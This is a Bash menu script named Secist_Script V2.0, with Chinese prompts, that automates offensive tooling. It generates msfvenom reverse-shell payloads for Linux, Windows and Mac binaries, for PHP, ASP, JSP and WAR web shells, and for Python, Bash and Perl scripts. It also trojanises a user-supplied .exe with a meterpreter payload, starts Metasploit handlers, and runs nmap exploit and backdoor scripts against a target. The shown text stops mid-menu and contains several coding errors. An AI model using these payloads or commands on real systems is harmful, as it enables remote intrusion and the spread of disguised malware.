#！ /bin/bash
LANG=zh_CN.UTF-8

#颜色定义
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfconsole='1'
else
msfconsole='0'
fi
# check msfvenom
which msfvenom > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfvenom='1'
else
msfvenom='0'
fi
# check nmap
which nmap > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
nmap='1'
else
nmap='0'
fi
# check wpscan
which wpscan > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
wpscan='1'
else
wpscan='0'
fi
# check nikto
which nikto > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
nikto='1'
else
nikto='0'
fi
echo -n Check script  = =;
sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done
if [ "$msfconsole&&$wpscan" == "1" ] && [ "$msfvenom" == "1" ]  && [ "$nmap" == "1" ] && [ "$nikto" == "1" ];then
echo -en 【已找到】
echo ""
echo ""
echo -e $BlueF 'msfconsole    【已找到】'
echo -e $BlueF 'msfvenom      【已找到】'
echo -e $BlueF 'nmap          【已找到】'
echo -e $BlueF 'nikto         【已找到】'
echo -e $BlueF 'wpscan        【已找到】'
echo ""
sleep 2
fi
if [ "$msfconsole" == "0" ] || [ "$msfvenom" == "0" ] || [ "$nmap" == "0" ] [ "$nikto" == "0" ] || [ "$wpscan" == "0" ]; then
fail='1'
echo -en "\b \e[0;31m【Fail】\e[0m"
echo ""
echo ""
fi
if [ "$msfconsole" == "0" ] ;then
echo -e 'msfconsole    \e[0;31m【!!】 Not Found, first must be installed metasploit\e[0m';
fi
if [ "$msfvenom" == "0" ] ;then
echo -e 'msfvenom      \e[0;31m【!!】 Not Found, first must be install metasploit\e[0m';
fi
if [ "$nmap" == "0" ] ;then
echo -e 'nmap          \e[0;31m【!!】 Not Found, first must be install nmap\e[0m';
fi
if [ "$nikto" == "0" ] ;then
echo -e 'nikto         \e[0;31m【!!】 Not Found, first must be install nikto\e[0m';
fi
if [ "$wpscan" == "0" ] ;then
echo -e 'wpscan        \e[0;31m【!!】 Not Found, first must be install wpscan\e[0m';
fi
meun(){
	clear
	echo -e $white "  -------------                                   "
	echo -e $white "  hi, i'm a Mo                                    "
	echo -e $white "  --------------                                  "
	echo -e $white "               \                                  "
	echo -e $white "                \                                 "
	echo -e $white "                 \                                "
	echo -e $white "         __.--'\     \.__./     /'--.__           "
	echo -e $white "     _.-'       '.__.'    '.__.'       '-._       "
	echo -e $white "   .'                                      '.     "
	echo -e $white "  /               Secist_Script              \    "
	echo -e $white " |                    V2.0                    |   "
	echo -e $white " |                                            |   "
	echo -e $white "  \         .---.              .---.         /    "
	echo -e $white "   '._    .'     '.''.    .''.'     '.    _.'     "
	echo -e $white "      '-./            \  /           \.-'         "
	echo -e $white "                       ''                         "
	echo ""
	echo -e $white "[1]     Get into"
	echo -e $white "[2]     Sign out"
	echo -e $white "secist> \c"
read num
	case $num in
		1)
		Client
		;;
		2)
		exit
		;;
		*)
		meun
		;;
	esac
}
Client(){
	clear
	echo ""
	echo -e $okegreen" ===================================================================="
	echo -e $cyan""
	echo "           +--^----------,--------,-----,--------^-, "
	echo -e "           | $red |||||||||   --------      |         O "
	echo -e $cyan"           +---------------------------^----------| "
	echo -e $cyan"            \_,---------,---------,--------------' "
	echo -e "              / $red"XXXXXX"$cyan /'|       /' "
	echo -e "             / $red"XXXXXX"$cyan /   \    /' "
	echo -e "            / $red"XXXXXX"$cyan / _______/ "
	echo -e "           / $red"XXXXXX"$cyan / "
	echo -e "           / $red"XXXXXX"$cyan / "
	echo "           (________(   "
	echo -e "            ------'        $red FIVE KILL !! GO GO GO !!  "
	echo ""
	echo -e $okegreen" ====================================================================="
	echo -e $cyan "       emali###317718435@qq.com$red          @墨###即刻安全  "
	echo -e $cyan "                         Long live the lazy !!!         "
	echo -e $okegreen" ====================================================================="
	echo ""
	echo ""
	echo -e $white "                  [$okegreen"1"$white]$white            MsfVenom"
	echo -e $white "                  [$okegreen"2"$white]$white            Nmap"
	echo -e $white "                  [$okegreen"3"$white]$white            Web Scanner"
	echo -e $white "                  [$okegreen"4"$white]$white            web_delivery"
	echo -e $white "                  [$okegreen"5"$white]$white            Brute-force attack"
	echo -e $white "                  [$okegreen"6"$white]$white            File injection Payload"
	echo -e $white "                  [$okegreen"7"$white]$white            Back"
	echo " "
	echo -e "secist> \c"
read num1
	case $num1 in
		1)
		msfvenom
		;;
		2)
		nmap
		;;
		3)
		Scanner
		;;
		4)
		web_delivery
		;;
		5)
		Brute	
		;;
		6)
			echo -e $white "secist>File injection Payload"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port 
			echo -e $white "  		>>请输入你放入的文件名称: \c"
			read file 
			echo -e $white "   		>>请输入你的保存的文件名称: \c"
			output
			echo " 请稍等几分钟，您的烤鱼即将出炉========》"
		    echo  "################################################################## "
		    echo ""
		    sleep 1
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "  | Name       ||  Descript   	          || Your Input              "
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
		    echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
		    echo -e "  | OUTPUTNAME ||  The Filename output    || $output.exe            "
		    echo -e "  +------------++-------------------------++-----------------------+"
		    msfvenom -a x86 --platform windows -x $file.exe -k -p windows/meterpreter/reverse_tcp  LHOST=$ip LPORT=$port –b “\ x00”  -f exe > output/$output.exe
		    sleep 1
		    echo -e "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rc
		    msfconsole -r  resource/handler.rc
   fi
    ;;
		7)
		meun
		;;
		*)
		Client
		;;
	esac
}
msfvenom(){
	clear
	echo "          \|/  "
	echo "          \|/  "
	echo "         .-*-   "
	echo "        / /|\     "
	echo "       _L_         "
	echo "     ,     .         "
	echo -e $okegreen" (\ /  O O  \ /)  $red  __  __ ____  _______     _______ _   _  ___  __  __"
	echo -e $okegreen"  \|    _    |/   $red |  \/  / ___||  ___\ \   / / ____| \ | |/ _ \|  \/  |"
	echo -e $okegreen"    \  (_)  /     $red | |\/| \___ \| |_   \ \ / /|  _| |  \| | | | | |\/| |"
	echo -e $okegreen"    _/.___,\_     $red | |  | |___) |  _|   \ V / | |___| |\  | |_| | |  | |"
	echo -e $okegreen"   (_/ alf \_)    $red |_|  |_|____/|_|      \_/  |_____|_| \_|\___/|_|  |_|"
	echo ""
	echo -e $white "                  [$okegreen"1"$white]$white            Binaries"
	echo -e $white "                  [$okegreen"2"$white]$white            Web Payload"
	echo -e $white "                  [$okegreen"3"$white]$white            ShellCode"
	echo -e $white "                  [$okegreen"4"$white]$white            Scripting Payloads"
	echo -e $white "                  [$okegreen"5"$white]$white            back"
	echo -e $white "secist> \c"
read num2
	case $num2 in
		1)
			echo -e $white "[1]    Binaries(Linux)"
            echo -e $white "[2]    Binaries(windows)"
            echo -e $white "[3]    Binaries(Mac)"
            echo -e $white "[4]    back"
            echo -e $white "secist>Binaries>> \c"
            read binnum
            ;;
        2)
            echo -e $white "[1]    Web Payloads(php)"
            echo -e $white "[2]    Web Payloads(asp)"
            echo -e $white "[3]    Web Payloads(jsp)"
            echo -e $white "[4]    Web Payloads(war)"
            echo -e $white "[5]    back"
            echo -e $white "secist>Web Payloads>> \c"
            read webnum
            ;;
        3)
            echo -e $white "[1]    ShellCode(Linux Based Shellcode)"
            echo -e $white "[2]    ShellCode(windows Based Shellcode)"
            echo -e $white "[3]    ShellCode(Mac Based Shellcode)"
            echo -e $white "[4]    back"
            echo -e $white "secist>ShellCode>> \c"
            read shellnum
            ;;
        4)
            echo -e $white "[1]    Scripting Payloads(Python)"
            echo -e $white "[2]    Scripting Payloads(Bash)"
            echo -e $white "[3]    Scripting Payloads(Perl)"
            echo -e $white "[4]    back"
            echo -e $while "secist>Scripting Payloads>>\c"
            read scrnum
            ;;
		*)
		 Client
		;;
	esac
		case $binnum in
			1)
			echo -e $white "secist>Binaries(Linux)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用linux/x86/meterpreter/reverse_tcp攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > shell.elf
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rc
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			2)
			echo -e $white "secist>Binaries(Windows)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]Please wait a moment, you are using:windows/x86/meterpreter/reverse_tcp payload>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rc
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			3)
			echo -e $white "secist>Binaries(Mac)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]Please wait a moment, you are using:osx/x86/shell_reverse_tcp payload>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > shell.macho
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD osx/x86/shell_reverse_tcp payload" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rc
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			4)
			msfvenom
			;;
		esac
		case $webnum in
			1)
			echo -e $white "secist>Web Payloads(php)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用php/meterpreter_reverse_tcp攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.php
    		cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD php/meterpreter_reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rc
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			2)
			echo -e $white "secist>Web Payloads(asp)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用windows/meterpreter/reverse_tcp攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > shell.asp
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rcq
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			3)
			echo -e $white "secist>Web Payloads(jsp)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用java/jsp_shell_reverse_tcp攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.jsp
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD java/jsp_shell_reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rc
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			4)
			echo -e $white "secist>Web Payloads(war)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用java/jsp_shell_reverse_tcpp攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > shell.war
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD java/jsp_shell_reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rc
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			5)
			msfvenom
			;;
		esac
		case $shellnum in
			1)
			echo -e $white "secist>ShellCode(Linux Based Shellcode)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e $white "  		>>请输入要生成的语言: \c"
			read language
			echo -e $white "  		>>需要编码的次数:   \c"
			read ci
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	           || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  | language   ||  The Listen languages   || $language              "
			echo -e "  | number     ||  The Listen numbers     || $ci                    "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用linux/x86/meterpreter/reverse_tcp攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		sleep 1
    		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -i $ci -f $language
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rcq
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r resource/handler.rc
		    fi
		    ;;
		    2)
			echo -e $white "secist>ShellCode(Windows Based Shellcode)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e $white "  		>>请输入要生成的语言: \c"
			read language
			echo -e $white "  		>>需要编码的次数:   \c"
			read ci
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	           || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  | language   ||  The Listen languages   || $language              "
			echo -e "  | number     ||  The Listen numbers     || $ci                    "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用windows/meterpreter/reverse_tcp攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		sleep 1
    		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -i $ci -f $language
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rcq
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r resource/handler.rc
		    fi
		    ;;
		    3)
			echo -e $white "secist>ShellCode(Mac Based Shellcode)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e $white "  		>>请输入要生成的语言: \c"
			read language
			echo -e $white "  		>>需要编码的次数:   \c"
			read ci
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	           || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  | language   ||  The Listen languages   || $language              "
			echo -e "  | number     ||  The Listen numbers     || $ci                    "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用osx/x86/shell_reverse_tcp攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		sleep 1
    		msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -i $ci -f $language
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD osx/x86/shell_reverse_tcp" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rcq
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r resource/handler.rc
		    fi
		    ;;
		    4)
			msfvenom
			;;
		esac
		case $scrnum in
			1)
			echo -e $white "secist>Scripting Payloads(Python)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用cmd/unix/reverse_python攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > shell.py
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD cmd/unix/reverse_python" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rcq
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			2)
			echo -e $white "secist>Scripting Payloads(Bash)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用cmd/unix/reverse_bash攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > shell.sh
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD cmd/unix/reverse_bash" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rcq
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			3)
			echo -e $white "secist>Scripting Payloads(Perl)"
			echo -e $white "  		>>请输入ip地址: \c"
			read ip
			echo -e $white "  		>>请输入反弹端口: \c"
			read port
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | Name       ||  Descript   	          || Your Input              "
			echo -e "  +------------++-------------------------++-----------------------+"
			echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
			echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
			echo -e "  +------------++-------------------------++-----------------------+"
			sleep 1
			echo -e $red "[+]请稍等，您正在使用cmd/unix/reverse_perl攻击载荷>"
    		echo -e $cyan "[+]################################################################## "
    		msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$port -f raw > shell.pl
    		echo -e $white "Do you start the payload handler? y or n: \c"
		    read handler
		    if [ "$handler" == "y" ]; then
		    echo "use exploit/multi/handler" >> resource/handler.rc
		    echo "set PAYLOAD cmd/unix/reverse_perl" >> resource/handler.rc
		    echo "set LHOST $ip" >>  resource/handler.rc
		    echo "set LPORT $port" >>  resource/handler.rc
		    echo "exploit " >>  resource/handler.rcq
		    echo -e $red "[+]加载完毕！"
		    msfconsole -r  resource/handler.rc
			fi
			;;
			*)
			msfvenom
			;;
		esac

}
nmap(){
	clear
	echo -e $cyan " "
	echo "        )   *           (      (         (   (   (            ";
	echo "     ( /( (  \     (     )\ )   )\ )  (   )\ ))\ ))\ )  *   )  ";
	echo "     )\()))\))(   )\   (()/(  (()/(  )\ (()/(()/(()/(\  )  /(  ";
	echo "    ((_)\((_)()((((_)(  /(_))  /(_)|((_) /(_))(_))(_))( )(_)) ";
	echo "     _((_|_()((_)\ _ )\(_))   (_)) )\___(_))(_))(_)) (_(_())  ";
	echo "    | \| |  \/  (_)_\(_) _ \  / __((/ __| _ \_ _| _ \|_   _|  ";
	echo "    | .\ | |\/| |/ _ \ |  _/  \__ \| (__|   /| ||  _/  | |    ";
	echo "    |_|\_|_|  |_/_/ \_\|_|    |___/ \___|_|_\___|_|    |_|    ";
	echo "                                                          ";
	echo -e $red"    Nmap Script Engine - Advanced Scanning with Nmap Script "
    echo -e $white"                  [$okegreen"1"$white]$white             afp-path-vuln  "
	echo -e $white"                  [$okegreen"2"$white]$white             broadcast-avahi-dos "
	echo -e $white"                  [$okegreen"3"$white]$white             clamav-exec "
	echo -e $white"                  [$okegreen"4"$white]$white             distcc-cve2004-2687 "
	echo -e $white"                  [$okegreen"5"$white]$white             dns-update "
	echo -e $white"                  [$okegreen"6"$white]$white             firewall-bypass "
	echo -e $white"                  [$okegreen"7"$white]$white             ftp-libopie "
	echo -e $white"                  [$okegreen"8"$white]$white             ftp-proftpd-backdoor "
	echo -e $white"                  [$okegreen"9"$white]$white             ftp-vsftpd-backdoor "
	echo -e $white"                  [$okegreen"10"$white]$white            ftp-vuln-cve2010-4221 "
	echo -e $white"                  [$okegreen"11"$white]$white            http-adobe-coldfusion-apsa1301 "
	echo -e $white"                  [$okegreen"12"$white]$white            http-aspnet-debug "
	echo -e $white"                  [$okegreen"13"$white]$white            http-avaya-ipoffice-users "
	echo -e $white"                  [$okegreen"14"$white]$white            http-awstatstotals-exec "
	echo -e $white"                  [$okegreen"15"$white]$white            http-axis2-dir-traversal "
	echo -e $white"                  [$okegreen"16"$white]$white            http-cross-domain-policy "
	echo -e $white"                  [$okegreen"17"$white]$white            http-csrf "
	echo -e $white"                  [$okegreen"18"$white]$white            http-dlink-backdoor "
	echo -e $white"                  [$okegreen"19"$white]$white            http-dombased-xss "
	echo -e $white"                  [$okegreen"20"$white]$white            http-enum "
	echo -e $white"                  [$okegreen"21"$white]$white            back"
	echo ""
	echo -e $white "secist> \c"
	read nmapnum
		case $nmapnum in
			1)
			echo -e $white "secist>afp-path-vuln"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -sV --script=afp-path-vuln $ip
			;;
			2)
			echo -e $white "secist>broadcast-avahi-dos"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -sV --script=broadcast-avahi-dos $ip
			;;
			3)
			echo -e $white "secist>clamav-exec"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -sV --script clamav-exec $ip
			;;
			4)
			echo -e $white "secist>distcc-cve2004-2687"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -p 3632 $ip --script distcc-exec --script-args="distcc-exec.cmd='id'"
			;;
			5)
			echo -e $white "secist>dns-update"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -sU -p 53 --script=dns-update --script-args=dns-update.hostname=foo.example.com,dns-update.ip=192.0.2.1 $ip
			;;
			6)
			echo -e $white "secist>firewall-bypass"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 $ip
			;;
			7)
			echo -e $white "secist>ftp-libopie"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -sV --script=ftp-libopie $ip
			;;
			8)
			echo -e $white "secist>ftp-proftpd-backdoor"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap --script ftp-proftpd-backdoor -p 21 $ip
			;;
			9)
			echo -e $white "secist>ftp-vsftpd-backdoor"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap --script ftp-vsftpd-backdoor -p 21 $ip
			;;
			10)
			echo -e $white "secist>ftp-vuln-cve2010-4221"
